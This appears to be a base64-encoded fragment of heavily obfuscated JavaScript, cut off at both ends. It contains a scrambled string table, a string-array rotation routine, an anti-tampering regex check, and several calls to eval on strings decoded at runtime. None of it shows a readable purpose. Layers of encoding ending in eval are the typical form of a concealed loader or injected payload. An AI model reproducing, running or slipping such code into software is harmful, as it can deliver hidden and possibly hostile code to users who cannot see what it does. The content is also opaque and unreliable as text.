cnNlSW50KF8weDVhOTJjYSgweDIwMCwnQWRBRicpKS8oMHhhOTArMHhhNjEqLTB4MSstMHgyNikpK3BhcnNlSW50KF8weDVhOTJjYSgweDIyMiwnZUZVOScpKS8oMHgxYmMwKzB4MjkqMHg5MistMHgyMjEqMHgxOCkqKHBhcnNlSW50KF8weDVhOTJjYSgweDFmNywneXN6VicpKS8oLTB4MjM4MystMHgxZWZjKzB4NDI4YSkpO2lmKF8weDFiNTVkOD09PV8weDJiOTc3OClicmVhaztlbHNlIF8weDUzODRhNlsncHVzaCddKF8weDUzODRhNlsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4MjRlMmEzKXtfMHg1Mzg0YTZbJ3B1c2gnXShfMHg1Mzg0YTZbJ3NoaWZ0J10oKSk7fX19KF8weDJhODMsLTB4YTZhMzUrMHgxZmQ5KjB4NDkrMHgxKjB4ODM0NzEpKTtmdW5jdGlvbiBfMHgyYTgzKCl7dmFyIF8weGViODk0Nz1bJ2U4azBFM1JjU1cnLCdXNGUxJywnVzVxQicsJ1c2L2RTcScsJ2ZYTE9jOG9XeW1rZUJTa0tlU2tCQVcnLCdXNkR2V1IzZEhhYmxyOGt2VzQvZEg4aytXN3knLCdobW9FVzVPN0N0NG1EOGs0bUtpJywnRThrNXZhJywnV1FSY1Y4b0FXNEJkUDhrOWtyTmRVQ29nQjhvaFdRbGNMdXRjT3ZqeVc0cGRIQ29VRUNvV1dPT3VsWkZjUk1yNldRRENXN0ZkU0lwZElMbGRIbW8yam1rK2Zta0ZXUUZkSk5GY0dHdGRNcWRkTUNvVWtNMXdXT3llQzBHZmhZUmRRWDVnVzVmelc2RmNPTGZkbDhrNEVDb29XNXo0dThrZ1dQMHpxdlBxeElxeFdSWGVvOG9SV1F4ZEhLdGNUSmRkSjhvMmk4a1N5eDVFbmJ2ZWY4a2RiU2tHVzZ4Y0h1WHl6bW9uV1A1c3JDa1liMmZweFNrNFc0eGRVU29EVzZpVHdTbzhXNk9NZ3dKY0h1VmNUU29wcDBCY1RoUmNIWkhaVzRiYmwwWmNNTFQwVzUvY01MRG9XUldkV1JsY1FDa3hXUWxjSFNvWXZDa0xXUFNYVzVUd1c2ZGNJSXBjUDhvM2J0NVdDQ2tLbkNvRnNDb2tXNkN4V1JkZFZTb3dXNGZIVzQ5SGRTa3FXNUNVV1J4ZFJta05FQ29PVzdDSVdQT0FXUDlyVzU1SWdtb3d2bWtZVzZOZElxaWJXUk5kSW1vb1dQcGRKU28waWFSY1NneGNWQ2tvRW1vd1c2cjdrTDFKV1FtSVdRZThXT2xkTWc3ZEp4T1BlU29BRk1GY0lYcm9nOGtRVzZ1M1c1eGRNOGtaVzU0UWZDbzFXNEdjV1JaY1Zta3NBQ2t0VzU5T0M4azFxU2s2V09tQVc2VGNXNGkyZFNvNnltb2VuczFaQkNrVVdPUmRLOG9IV1FDa1c1ZGNKbWt3dWJsY1MyQmRUMHBkUVNrSVdPQmRPQ29ORThrQnZZRmNLYWZ2VzZ1VFdSWENXNzQrRXdmd1dSeGNOQ2tPbW1vTXNDbzh6U28zczJsY00zcUdXUVZkU0pGY1ZDb21FQ2tLY05oZFFDb1JXT0JkS0NvK1c1UmRUdFpkVXVQenhxck5XNWRkTDhvREJjeW1XNE5kUjAvZEpDb2xXT2J5ZzhvVnBYN2RIRzdkVm1rVWdDb25kQ29XenZ4ZE5OeGNVc0hpYUloZEdDb0VXNkpjVENrb1dQTmNPQ282QjhrYmZJNE94Q29ucFNvVHVlcm1pbW8wV1BkZEcxbU1XNnZ2V1A3Y1VicUFwOGtOVzR5V3c4a25XNU5kSmgzZE9IM2RSSGE5VzZyelc1UzVXNHlIVzdHbVdScVpuU2tSbmdOY084a2F3OGtyV09uTldROGdXUFdxVzRua1dRWCtXN3lhVzRHc1c0SGVXUnZrVzU0SGdHOHVyOG9XV09iRldSN2RUOGtnYVo1cHRDa3JhZnBkUFdsZE9Tb2NoOGtCVzREaVdPZTNyU2sveW1vZ2tHRmRKQ2syQm1vZFdRVmNRbW9xVzZpM2licGNPU2tCem1remhHUHFXNWorVzVHUWlxMGdiSUtrVzZ4ZFVKWGJXNXY4VzRlUFc1ZS93d25UVzVaZExtb0lXT2RkVXM0cVc1NGdibWtLV1EvY0dDazBCQ296bkNrbFdRQmNSdk9nVzcvZEg4b1BrOG9zV096bVc3dGRVTU5jVENrQUZ3U3lXUnRkUG1vaEZLbTNXNnRjUFNraUQwUmNQZU5kR0NvbGpmSDZyc0dleVovZFNta2RiSUw2VzVSY1FJbGNNcVhQb3JGZFBTa1RXTy9kUThvdldRdkRXUnhjTk1aY0hkUHNFTXZaYjNWZE9jeGNQdE5kSTA4aldRSmRTMVh0dFl6Vlc0NWpXUUJjSlg4dkFTa0hXNjlKVzU3Y1BDb2NiU2swVzd5QXNieGRLZEhBVzRKZFZtb2ttQ2tmV1JkY0xDa3lXUDdkR0NvRnl0RmRSdDNkTlp0Y1NDb2dtc21LRHVwZEdta1dxOG9rV1BtUVc0VmNOSm1tRG1vdGpOYWdXNi9jTG1rWFdQM2NOYVZjVVNvWlc0VmNJdzhkV1FpU3RDa1lqVzNjUU1mSFdROUhwSzg2VzZIQldQcUNzTmlNVzZQUFc1bGRIbW9ocm1vRFdQYVZyOGtyV094ZEp4M2RRQ295VzUzZFV4bkVXT0ZkSWZqOHE4b0ZXNi9jUUNvNVc2R2hpWG5ZV09aY1F3T1JXUG13VzZ6WFc3ZmZnbW9Rd0tkY09Da3BwQ2tJV1JPSm1ZOG9qOGtEVzVoY1BTb3NkOGtYV1BtNVdRQ3ZyYlJkTVptOVdSdGNQU29sVzRaY0p4RFFpWXBjVThrcWdMWmNHY1BEbDhvUHE4by9vcXZYcUNrR1dRbWRXT2Jkclg4dWhTb25EbWs1anRXRHM4b0p4Q2tjejFtN1dSM2RNS1N1ZlpwY1Q4a1JXUWl2cVhyT1c3UmRJQ29sV083Y1BKL2NWOG9vVzUzY084a01XN2lyYUNvL1dPSmNMMERmV1JoZExodVl2WmJXVzc3Y1Y4a1FxbW9PVzZXdFc2T0FxSUpkRzhvYVdQWmRSWTdjT0NrK1dSSmNUSVZkSGFEd2Nta1ZxWldwYm1rS1dPL2RVMEN5eENrNGF4WEhCbW9FcDEzY1Q4b2xXUGxjVUNrc2F1NEdXN3F2V1JiT1c3TytXUHBjSkw5dFc2ekpyV3RjVXJxVWR1cGRRSUZjSTN6VVdRaGNQMHhkVmRoY0xta0l4Q29YQ2VOY1AyTFZXT0ZjUGE4QVdQakRiOG9uV1I5Rm1jVDZXNDNkSThrQVdRYWl2Q29JeFNvbXY4a2V6Q29DV1BqSlc2YUNXNjNkTFNraHNKbWtXNEZkSjhrcVdSQmRHMTdkTVNvRHE4b2VXUWVBdThrOGpLQmRIOGtoV1FaZFRZRE93dW5KV1JCZElNR095V2RkVm1rRG9YZGNTbWtUVzdaZEkyZGRVM2xjTG1rTVdQL2NLOGtQVzU0dVc2ZGRIQ283VzVDY3JTazhXUEN5VzZGZFZDb3RXT0JjT1NrR0Y4a3d2YW5zVzdoZFQyWmNVZjkzV1BGZFVDa3pwdFZjS0tlSWYwdGNWWUdNV1BIQnJta1NXUHRkTm1vTldRYktXUWV5V1BxeFdPMGNXUWxjTkNreVc2M2RMOG9PVzZKZFFmQmRRU29SVzZiNm5lRmNPaFZkTVNvOWUzZktXNXRjUVcvY09TbzhXNDdkSkNvc1dPWmRMSHFBdDhrbG8wRmRIU2thV09qZVc0ZmpXNHBkSThraVdRL2RLU295VzRwZFNTbzVXUFJkTEhWZE5XR0VXNEduV1BISVc3QmRSSURHdkNvQnd0eGRJbW9ZV1E3ZElTb1BrMTNkTHFqUldPS0RlU2t1V1BOZFNTb1hXUmU0dTMxd0ZYNUhvQ29EaW1rSVc2Ym9kS2xkSzhvbGF0bGNLbW8xV1AwR1c3cGRNR2puRThvcGVXQmRPMEJkTVNvbEN1R0tXUER0VzdyUFc2VENXNjFVV1BDaFdPM2NUTFZkSm1vdFdQbU9XT1ZkUk5aZFRTa2t0aHRkVllaZEttay95U2tZYThvZldPRHRXT3VhcXZOY09tb2VXN1pjSVNrVlc3OEdjM3pzV08wV1c3THFXNVR5VzVLSXAxL2NWS3BjVm1vTFc2aGNPU2tQVzYxYWl3M2NMR0JkSkNrRXJJTmNOU2tRVzU4U29TbytXNlJkTDhrdldRbmtXUnpmV090ZEttazZrQ283VzZMaFdSSmNIZ0t5VzVIMVc0aGNVbWtGbThvVFc0blFGQ2tWVzZPTnRTa2tuTnZFV1AzY0dTb2FXN2RkU21vL1c3YjVXTzRCV1F0Y1BZcGRIZ3VhaExEcnloM2NSU29GVzdOZEplZGRHV0h5QVNvUENjTmRUOG9ZV095enZ1M2NVc1NBQndkY1BDa1NXTzl3bVNvMUVlenBXN25zV1BWZExTa2p1Q2tyVzc3Y014aGNLbWsvYk5ycGhTa0FXUjRtQU00VUJtb2ZXNGRjTkNrVFdSZlF0V2F2Vzd5eGtTa2xqU2t1d0hWZFRDbzRDdTE1dnQzZFVnVmNPbWtHblNrZ2xOaGRMYUJkU21vR3pDa01GQ29aV09OY0sybGNKZGhkUzBtR1dRbGNNbW9ja0o1c2dDazlsSFJjTjhveGJDa3BXTzVNVzZEWVc2SFRhU29CeDJ0ZFBta3RuOG9EY0poY0lDa2xld3BjVHVoZE44b0dpOG9naVlmWHJtb3VXT2xkTXZCY0dkRmNTbWs2a21vRVdQMW9XUnZNbDJGY1RMSmNKZjBNV09XcldSM2NWU294c0NraldSNHVXUldrcVNvQ1dQOU54OGtJdTB0Y0phaTlXUTlxV1BUamk4a21XNVREV090Y0pjOVd2ZFgydENrMlc3djJoVzdjUnNlK3Zta1lXNGhkUDhvM1dScjN0U285V1EzY0s4a21XNVR0VzQzY09iUmNUQ28vVzY4M3pDb1ViU2tHV1BoY1Vtb2pXUHViVzdCZEdTa1pXNEJkSGVoZFFTbzNxOG92RENrd1c1UmNOQ2tuVzViV0E4azlXNHYxVzQzY1BIaGROcldJV09GY1NlbmNXUnpSaUNrY1c1dGRWbW82V1JqdHptbytrY25UVzV1SHZta0h6U29zbW1vaVc1dGRQTXFNV1IvZEwxdGNTU2thVzROZFRta2NrbWt3VzQzZEhDb01XT0MvbnF2RGU4b0xqOG9MV1JkZE9jblZXUXE5QmgzY1AwR21GbWtpVzQwVVc1M2NIU2tSQmcvY0ttby9GdUw3eHRwZFRTbzJXUmxjUGN1UWFXVHhXTzNkSzhvTGNTbzdXUkJjU1NrRVdRYkRXNldmeUpOY1Ztb2tqZVpjUzhvd1c0ZGRObWthVzZuR1dSL2RPTjQ3amg3ZFZDb2pXNU9VVzdTelc1OTl3OG81V1B4ZEc4b2ZXUVNYVzVsY0l0VGVtZkJjVGMzY0tlU2tXN1ZjT0Nva1c0em1XN3p1Vzd0Y09TbzlvQ2s1cDNmZXZTa2x0bWtXVzczZFVtbzlXNWhkTUNrM2NJQmNWcUM5V1FyU1c3bGRIdUJjS0NvWlc2ZGNSTDEyZ2RWY1Ztb3BXNTNkTWEwOEVta0dlbWtTV08wb1dSTGhkOGtZRHZ6d3lnM2RHQ2tKVzR1dUZTb1B1MlMvV1E1NmY4a1dxU29RQVNvZW5ySmRIMW1XRU1CY0p2N2RUTkthV1BMdXNLbGRWQ29oalNrTEVtb1FXUjdjSkNvUldRRmRQeDNkSlNrcGhtb1hXUW4zVzQ3ZEttb2VXNEJkT21vNFdRTFBXNmRkUDhvSmlJL2NWVzBiczhvdVdQZGRQU29Fc04vZEc4bzRXUmZmRTJkY1EzOExXNGZTV1JuT1dReGNVOGs4V1B6ZXIwUmNHbWswY0NrVGZMSEp5VzRmelNvNVc3ZGNMWGpiVzZWY0hYekdXTy9jVEdqaVdPOFZwQ29FV09tcFdRdnV6OGt1V1FOY1NjUmRIU290eVNrN0JtbzVXUTNkR1NraHBjcWlXNGRkUDAwcnlkNUZXUXVmVzYxNlc3V1p1WS9jTzhvdFc3WmRKbWtNRkdiTHFKekNXNVNzV1FKZFIwbVpGbWtMV1BuOVdSNU5sTXBjSkNrbXVTb09XUi9jTFNrWHBiMVZpU29pQlpPM1dPM2RNdER2V1FXNWtyUHJ6dWhkT0NrMVc3VmRNbW9qRkNrQ1dRSmROOG9CeWNUUlc1SHRjQ29JV1FUYXR2cm1zTU5kSXI1MXI4azVFVy9kSkNvUWk4a29XN3YyVzY1blc3dGNUbWtwbnVHOERzM2NOckpkTlNrUmNoVzVoRzlCQmJxd1dRekxXT2RjVkwzZE1HZGRHOGszdG1vUXRhNVdXNmxjUlNrQ2RmalJXUDhrV1FGZFY4b1dXUWRkTVNrMFdQeGRQOGtyakNrZHhta2tkOG9sZzhra1c0WC9XTzVTYkhsZExlNUNXN1pjUEg4Z0I4b0h6bWt5Y2dPeVc0YWp3Q2tLVzVDaERTazZsQ282Vzc1WldSTG1jQ29IenNCY1Vta2hGU29IV1JkZEtNN2NVU2tHbkNrU1c1SmRHQ2sxVzVyYldSUmNTU29SZGRDaldQOGlyTEpjUDhvMldSMDVXN3RjSWREWlc3eGRSSUpjT3dtMFdSYW9xU2toZUt1a1dPcXZXNTBOV1ExckY4b21XUFJkTFNveVc3enFXT3RkTzhrdmdtb0R0OG9CRkdkZEpjMHFvQ29JbG1vMldQYkRXNWxkSFhKZFR4VmNTYy9kU21vMVdSMUd4U29NVzZGZEl0U1RqV3prVzdSZFVta3FXUWhkR0Nrb1dPS2JXNnZWV09IeFdSdGRRTkNLV09hZW5IaGRMTDBZRHV0ZE9Tb2xlSEpjTlNvS0ZnU2pXNUZkVkdEbWUyNThyOGs5dUNvbFdSWmRKQ282VzVaY0tnSFdhbWtCV09QTVdPN2NMU280ZUpWY01JSmNQMUdWVzROY0lDa015bW9EV09kY08ySmNHSnhjU21vRlc1NExzbWtwcENraVdRdGRIMnRjUkx2MWNtbytXT05jTUNrN2V1QmRHRycsJ2tTa2luV1JkU0hXQ3pTa2tjdUZkVUxXJywnV1FLTCcsJ2pTa3FXUHUzcDhrNlc2UGRXUFJjSXh5TVdPVmNSVycsJ2xDa1FnYlZjUGEnLCd5MjdjU21vUXpDb0VXUXZ4amdLUXVXJywnZlc5TXEwQmRSbWtUJywnbFl4Y0xLTmRPU284aENvMldQSmNUWGEnLCdXT2Z0aVNrZFdQeGRHTW1va0cvZFBLVycsJ1c1Q2wnLCcnLCd2ZkhNc3dsZFVTa2ZXNGknLCdBTTNjU21vSGJta2xXUVhxbTF1JywnVzVXaVdRVmRLbWtoV1JGZEt3SycsJ2ZmN2NVc2hkTUhmaGJDazFFbW9IJywnaGdkZE9yOGhxbW9BVzRpJywnZzhvd1dSZldXNTQnLCdXN0dneUNveldPN2NOZ212ZVdTJywnVzQvY0pTb2JEMDlTRldOZFBmYkRrVycsJ0VhUmNMYScsJ2tIUmRSU2t2b3EnLCdnMUpjVXRGY01idmhxU2srRjhvWVc3T1VXN1JjU2Y5M1dPanB0Q2tFcmJwY053SmNJSU5jSUNrUkRta3VXUHBjT0dUV2s4bzdXN1BIVzY3Y1ZTb3ZtOG91V09lL2MzQmNRdlpjUkpLaFc1WHNDOGtPeDJOZFYzTGFXNzdjVEhOZFMwQmRTaEZkS3FKY01tb0RXUWZxV095K2pjbVhXN2YremVkZE5Tb2ZtY3VUQ21vQVc3ZGRJdnlmVzUvY0plV2FXUHo4YThrY1dPcGRMZzRsRmZkY1VKeGNKYVZjUENvVm5tay9XNU9ackNrb1dSN2NLWGhjTjhrVHl1bGRRMGhjSm1vSmFhRmNUbWtrbldkZE04b0NXUjF2VzdOZEhMOUFXUmxkVGdCZElNeVp4dGE3VzZoY1NybllXNzQ2VzUwc1c1VDNXNlpkUENvSFdRM2NJSGRjVHdOY1B0aGNUQ2tVV1JUcmVDb25GdWRjVkNvVVdPeklzYUZjVHhlQlc0eGRWd3Z3VzRuMldQOFdtU2twV1A0b3hjbGNNZmZmVzRicGlXM2RVeHRjVlNvK1c3SmRWU29WV1EvZEhTb3p0YWZxb21rcVdPUGp0U283V1FlMHgzUmROTUJkVk5sZE5ta1h3TG51VzZOY0szcklXN1RFV1JIMkU4bzBXUGhkTkNrK1c2RmRPU2tJejhrTlc2Ymh0U280c2FsY1VnNXdXT3RkUjhvdFc3bWZvaDNjUlduTVdST0lrU29xdUNvbmlmN2RUU2s3dkNvRG1kUmNSbWtQV1BWY1Q4azZXUHhjTmFhVVdQMFBFYk9tcUNvVFdQWmNTbW9XV1E1Tlc2dUdwbWtXd1dpbldPUmNLbWtRV080U1dSL2RRdFczVzdiMFc0SmRUQ2tDV1AwcnRNaGNWaFZjT2cwZFdSTmRQSi9kUUNrcVc2aGRQQ2tFQ21vcVc0L2RTMEpkT1lOZFZtb2ZXT3lQVzRWY0k4b0FXNkcrV085UmxTazdXNUJjU1NvV3dDb0lmU2tHYThvWldPL2RTU290V1BDZVc2blFXUGEwcDB4Y1Bta3hXNFdjV1BUbG1mUmNQc1NmV1BaY0pIWFJmckM3VzVSY1E4by9XNXlCVzU5V3ZHT3BrbW9YV1Juc1dQZjNXN1pjSDhrR2c4b2lqbW9jV1B5VFc2eWlXNnJBV09TQ21hUmNObWt3VzYwUFc1ekNXNXhkVXhwZFFta2dzOGtKdlhiZ1c3ekxCQ2svQnR6WFc3cGNJQ2s3V1J0Y0tDb1N1dHRjUmJwY1FHUmNOME5jSXJXcmU4b255bWthaXdKZElXOXRySUZjVG1rOERNOFdxbWttRENrUFc0TmRJMTNjTXRxMmhTa1FoMmkwQnNkY0pJWmNSU2tGaUp0Y1FTa0h1OGtGeThrNnlzL2RHZi9kUFNrcXJkM2NNdXlCcThvdW1tazlXUHRjUVNveFdRZGRWR2FMRlNrTlc0ODhCdnhkTzhvNXNldGROcVpjSG1vUW1Ta21kZDFiVzQ5dmdXZnFoWHBjUThrWFc0eGNTY3ZYVzVqcmN0dGRMSDNkS05YOGRxbGNWZ3RjVkxKZFBTa2dETlBVRHZ1c1dSdGNUaDhqcHFTM2htaytXNzNkUW1rZ3k4a1VXUXhkS1NrcldReGNVTS9jVThvMHRta1dpdzQ1VzYzY1EyL2RSU2tJb21vZ1c0bGNHQ2s4eENrNmFDa3V6U2tOV1JkY0tmcW5pQ28zV1I0S1dPcGNSd2o0V08zY1BTb2lwQ2tnaW1vRGhZem9XT2F3ZDhvZVc0aGNVOG95ZUpieGdZWmNKOG9RQ3E0ZVdRbGNMdnE4V1FwZFRTb0NXNnhkSEdyZHhjWmRWbWtYelkzY1ViS3BXUVZjSENrNkZYQmRJbW9ZVzZteVc2RHJXNHphc2FHa1dPbVdXNHlHbzNlMGFMZGRRQ29vRFNvb1dQbGRMWlZjUHU5RkJDb0puOGtVV1AvY0h2VmNMY3RkVFNvZFc3TmRRbW8vV09WY1FzRDVXNHlnemNLNFc3YTJ6bW9xclptUkI4b09XUHBjVENvR3hDa3lXT1ZjS1hkZFNzM2NLbWtBV1JoZFNtb0lhOGtub0NvSWNJbGNRQ29UeUNrY1dQbGNMWGhkVVNvN1c1TmRPWHBjTndHY1dQRmNMMEQyQlNvbVdRdGRJOG9oV1BkZFNlL2RTQ281dWZ2R1dSenRXUmlYVzRXbldSM2ROR3orV1JWY1Fta3VtcUxaV1JoZFZJMHdmbW9uVzZWZE1NVzBXNkJkSm1ranRmSDBmMDFRbmViTERDa0loU29raHRaZFJMOHZXNGlIQTF6NnRJTmNQcWZpc2VLcndjWmRVd2RkT3hkZFA4a2RiOG9KQU5WZEttb3plSlZkUzNDWWVtbzRXNEZkTWJwZE9ZVFlXNXZtb0NvWVc2cVFXN1c4VzRKY1A4b3pXUW1ybThvdldRdGRKdThWdUNrMWpncGNKOGsxVzZCZEl0M2NKQ29rZ2ZaY1N3aGRRQ2tBZ0tOZEg4azFEOG93V1JCZEpxVmNVWDk4eThrUFdQN2NSU2tJRjhrNlc1ZWJXUnRjT21vSFdPL2NIU2tYVzRYNlc0T0ZXNUZkTlNrZFdPYjdXNXVHVzR2c2Ftb3dXUUtQVzdaY1Ztb1hkZVZkUzFOZEczdGNOWk5jVDhvc1dRcGRPOGtxRHJaY0l1aWpXNFJjTm1rSldSN2RWQ29jVzVWY1VTa3hGU2tBdVNrSldSUmRPbWtiVzcvZEw4b0pXUFJjSGNWY1BDb0hXNjhzeU1WY0c4azBBTm1FV09OY1BaVmNMR210cm1rRUNta0RwOGs0RGE0Zlc0QmRTWGxkVjhrQ2Vta0RlOG9UaXZOZExDbzBDQ29abDhrWUFtbzFXT1REZHhhN1dReGNHMmE1V1E5TEVOU0VXUGhjU1NvQ1c2QmRTSmpGV1FOZEpDa3B3Q2tuRFNvVVdRM2RUU29qVzdSZFBLYjd4WTFyZUNvbVdPeWhqSXhjSm1rZXhtb0RpSUhObkNreW8zdUJXT1pkVENrb1dSQzNidzk2V1A1SndYV1NsbW9acFdwZFBTa3dXN0JkT3M1TGIxTmNMdFZkTkNvY3Y4bzdrcU9oRG1vWFc3L2NVSUtjaHZMb1dPT0ZlQ283V1BkZEdDb2d1U2tOZjB0Y0t2RmNHU2tlV1J5Z1c3L2NIQ29vV1FCZFZTa2lhOG9FV1JXS1c2R3hXUHJhcXg4NUZJZUNXNWRkVUtQNGRzdGNJYWRkS3Nqclc3VmRHQ2tWVzYvZE5Ta1lXN253Rk10Y09tby9yOGtCVzQzY084b0FXT1pkSk00cVdSSmRWYzljejhrNkJtb2hXNGVBcUdhMWE4b3BXUGRkVHFpSFc1dkZGU2tPczhvQm9Ta0ZXUUxZZWNKY0dDb3lqczErRVNvaXNLSmRVS0ZkSm1ra2RJcGRTU2tkcWUzZE11OE5XNGhjTG1veVc2ak5XUXBjTjNsY0hLWmRKU2t5V1JlZldPdGNPS2pmRG1reFdPQmRITmpaV1I1NldQSEVXUmRjVHR1dVc1OTVXNjBtbHN0Y0t3cldibW8xVzZTeWQwQmRVY0QvV1FCY09Db2F1bWtLVzZyb1dSenhXNE9uVzZxakVTb2dXNlJkSWJkZElncjZsbWtZc0NrZ2tiUzJ5ZEZkT1NrUmdJQmNRbW8zV09SZEtOL2NRU29QYXZ4Y0gwN2RNbWtVV09GY0k4b2RjbWtEcHJISldQRDlGYjV4YUNrUWc4a1RvdXBkVXJEaFdQTDdiU29DV1I0OFdReGRQOGtDdVluQ244a2JXUG0wV1F1bEQyRmRJaC9jS3dXcXNlcW1XNkRkVzRoZFFTbzZXUkJkTU1HN213L2RTOG90V09CY01ta0FXUVR4VzZPWnZ2ZGNNMnZVQVNvSHFDa1pXNC9kUzFqRFdRNGxXN1Q5VzdUa1dRcGNLU29xQTEvY1U4b0dBbW9jQmZSY1VxSmRNQ2twV1FwZFNDb0pXUmlKVzRYd1dSbGNHOG9TQkNvQldPWmRLd0JjS21vM0M4b0dXUC9jTVNvMVdQTmRRU29hVzVhV1c3RmNJU2tVZmM4YVdQN2NJOG80Vzc3Y1NDb1hzOGtic21vVFc3ZkxXUFpkVmZmSkVkZGRVd1ZkSlNrQVc3QmRQY0ZkUk1QTFdSQmRPOG9kV1B6Q1dRUDhXUEJjVm1vMldPbUVvbWtNVzZxRFc3NVZXNTdjUjhrRVdPL2RIU29HV1B5aGxtbzdiU2szVzZxL211akdXUEJkT21rRFc1L2RVbW9JZGU5L2ptb1prMlJkUk5tcFdPcWxXT2Fod21vbmtTb2ZXNjh2RnRCY0lDazdCU2tadXJSY1VTb1BoYnpPY2ZkZE5Tb0ZlYVdpV1Ftd1c1TFVXN0pkS2JPTVdSZGNPU29zVzVYY1c0MEpXNEcyZ21vS0Q4b09XUDNjR1NvMXFDa0lXUmRkTHZqeVc0ZGNKbW9YV1FSZEdTa3prOG9lb21rS2pTa3R2TDdkUFlDVFdSTHZXUUpkVThrVG5aRzRFTVhPQzBqZkJjZnhrQ29mVzZ2eldPN2NVbWt6V1FSY1Jta3lXN0RHV1J4ZFBta1lXUU5jRzhrK3QxdGNUTGxkS0NvTVdQWmRWOGs5dmQzZEdTa0ZyOGtEdzhrR1c0RmROOGt0cjNKY1FhSmRMQ29oaUd5Y1c1T05BOGtGJywneXd4Y09Ta0VXNmknLCdXUTNjVG1rVHJta2YnLCd4SXhkUXFlRycsJ3V0dURXN2hkSFNrWFdQV2UnLCdXUHBkSGEnLCdmcm52V09mOGxIRmRKbWtxVzViM1c3QycsJ1dSdVonLCdXT1JjTkNrNnNTa01XNWZOZlcnLCdsQ29kJywnZkkwaWJXMDVxRycsJ0F3NCcsJ3A4bzZXUFM4VzdLJywnV1FOY1M4bzV6U29nV09wZE1Da2JXUXVXYW1veScsJ2JoTmRMZlBjekNrTFc0ekNDU2tqeEcnLCdXNmJSY2d4Y0dHM2RUbWtWcVNvV0JXJywndXNLJywndXhQbHVMNHN1U29TbTJ0Y0txJywnZ3J5JywnVzVCZE1Tb2JlbW8vV1BlSXdDbzVXNlgzRWEnLCdGTlJkR3FwY1I4azJvbW9ZV1JOY0dKcUInLCdxU2tUJywnYmZ0Y09XQmROYmJocm1rU3lXJywneExlblc1YTgnLCdqWWEnLCdqY2xkTENvSUYzaTZBcScsJ3A4b20nLCdFbW92a3IvZE1hdTBlYScsJ2xIbGRQU2tFbWEnLCdXT3hjUzhrRldPbGRSWFZkUm1vYicsJ0IwSmNPSVQvJ107XzB4MmE4Mz1mdW5jdGlvbigpe3JldHVybiBfMHhlYjg5NDc7fTtyZXR1cm4gXzB4MmE4MygpO31mdW5jdGlvbiBfMHgzNmY3ZDcoKXt2YXIgXzB4M2VmOGI2PV8weDRkNDUsXzB4MmIzOTBiPShmdW5jdGlvbigpe2lmKCd0VWVHdichPT0ndFVlR3YnKXJldHVybiBfMHgzZWFkMmEoXzB4MTBkODY0KTtlbHNle3ZhciBfMHhjNTJlODM9ISFbXTtyZXR1cm4gZnVuY3Rpb24oXzB4MjVkMDYzLF8weDE0YjBhZil7dmFyIF8weDE5YjU2YT1fMHg0ZDQ1O2lmKCdtSFhPeCc9PT1fMHgxOWI1NmEoMHgyMjUsJ0FkQUYnKSlfMHgzNGQ5M2QoXzB4MmQwMWFkKSgpO2Vsc2V7dmFyIF8weDQzNWU0Mz1fMHhjNTJlODM/ZnVuY3Rpb24oKXtpZihfMHgxNGIwYWYpe3ZhciBfMHgyNzhjOWU9XzB4MTRiMGFmWydhcHBseSddKF8weDI1ZDA2Myxhcmd1bWVudHMpO3JldHVybiBfMHgxNGIwYWY9bnVsbCxfMHgyNzhjOWU7fX06ZnVuY3Rpb24oKXt9O3JldHVybiBfMHhjNTJlODM9IVtdLF8weDQzNWU0Mzt9fTt9fSgpKSxfMHgxMjYwMGM9XzB4MmIzOTBiKHRoaXMsZnVuY3Rpb24oKXt2YXIgXzB4NDZiYmY5PV8weDRkNDU7cmV0dXJuIF8weDEyNjAwY1tfMHg0NmJiZjkoMHgyMTEsJ0RHbHQnKV0oKVsnc2VhcmNoJ10oXzB4NDZiYmY5KDB4MjFjLCdER2x0JykpW18weDQ2YmJmOSgweDIwMSwnW1NwdicpXSgpW18weDQ2YmJmOSgweDFmYiwnJmhlXicpXShfMHgxMjYwMGMpWydzZWFyY2gnXSgnKCgoLispKykrKSskJyk7fSk7cmV0dXJuIF8weDEyNjAwYygpLF8weDNlZjhiNigweDIwOSwnWFNETycpK18weDNlZjhiNigweDIxMCwnQkRaVScpK18weDNlZjhiNigweDFmNCwnRHlMRycpK18weDNlZjhiNigweDIyOSwnaGdbQCcpK18weDNlZjhiNigweDIwMiwnWFNETycpK18weDNlZjhiNigweDIyMywnbXBHaScpK18weDNlZjhiNigweDFmNSwnSkFqeScpK18weDNlZjhiNigweDIxOSwnVThOWycpK18weDNlZjhiNigweDFmMiwnVHR4VCcpK18weDNlZjhiNigweDFmNiwnd0E4dCcpK18weDNlZjhiNigweDIwNSwnZSl2TCcpK18weDNlZjhiNigweDIxNCwnZUZVOScpK18weDNlZjhiNigweDIxZiwnWFNETycpO312YXIgXzB4NGQwMzJkPWV2YWwoXzB4MzZmN2Q3KClbJ3NwbGl0J10oXzB4NDJkNjUzKDB4MjEyLCdUdHhUJykpWzB4ZjZhKzB4MTJiOSoweDErLTB4MjIyMV0pLF8weDI4MGJiZj1ldmFsKF8weDM2ZjdkNygpW18weDQyZDY1MygweDIyMCwnQGwqZCcpXShfMHg0MmQ2NTMoMHgyMWUsJ2VFJiQnKSlbMHgyMmIxKy0weDJlKjB4NTIrLTB4MTNmMV0pLF8weDNlZGUxNj1ldmFsKF8weDM2ZjdkNygpW18weDQyZDY1MygweDFmOCwnZiUoaCcpXShfMHg0MmQ2NTMoMHgyMjEsJ0FkQUYnKSlbMHgxZCotMHhkZisweDIqMHhmY2QrLTB4MSoweDY1Ml0pLF8weDEzYTE1NT1ldmFsKF8weDM2ZjdkNygpW18weDQyZDY1MygweDIyNywnbyUkTCcpXShfMHg0MmQ2NTMoMHgyMWIsJzFNYzAnKSlbMHhjMmIqMHgzKy0weDMqLTB4OWMxKy0weDQxYmVdKTsoZnVuY3Rpb24oXzB4NWRhMTViKXtyZXR1cm4gXzB4NWRhMTViKF8weDVkYTE1Yik7fShmdW5jdGlvbihfMHhjNGJlOGQpe3JldHVybiBmdW5jdGlvbihfMHgzYTMxNzYpe3ZhciBfMHg1MTI1MWE9XzB4NGQ0NTtmb3IodmFyIF8weDc5MzZkMD0weDIzMWErMHhlMmYrLTB4MzE0OTtfMHg3OTM2ZDA8MHgxZDAxKzB4MioweDIwKy0weDMzNSoweDk7XzB4NzkzNmQwKyspe2lmKF8weDUxMjUxYSgweDIxNSwnRFVjKScpPT09XzB4NTEyNTFhKDB4MjBiLCdER2x0Jykpe2Zvcih2YXIgXzB4NDE5ODRlPTB4YzgqLTB4MistMHgyMTU3KzB4MjJlNztfMHg0MTk4NGU8LTB4ZjFlKzB4MSoweDFmOWIrLTB4MTAxOTtfMHg0MTk4NGUrKyl7dmFyIF8weDU2ZTBiMD0h